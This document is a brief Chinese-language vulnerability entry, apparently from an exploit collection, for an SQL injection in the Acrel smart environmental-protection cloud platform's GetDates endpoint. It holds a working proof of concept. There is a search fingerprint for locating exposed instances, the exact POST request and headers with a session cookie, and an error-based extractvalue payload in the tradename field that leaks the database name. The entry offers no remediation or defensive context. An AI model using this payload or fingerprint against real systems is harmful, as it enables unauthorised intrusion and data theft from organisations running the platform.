# 安科瑞智能环保云平台GetDates存在SQL注入漏洞

- **系统**：安科瑞智能环保云平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="myCss/phone.css"`
- **请求**：`POST /MainMonitor/GetEnterpriseInfoMapByDate/GetDates HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: ASP.NET_SessionId=ansfwnaiqbeqi5rak0fbmr5s`

**请求体 / payload**
```
userid=admin&state=1&time=2025-12-20&tradename=1'+and+extractvalue(1,concat(0x7e,database(),0x7e))--+-
```
- **预期**：200　|　—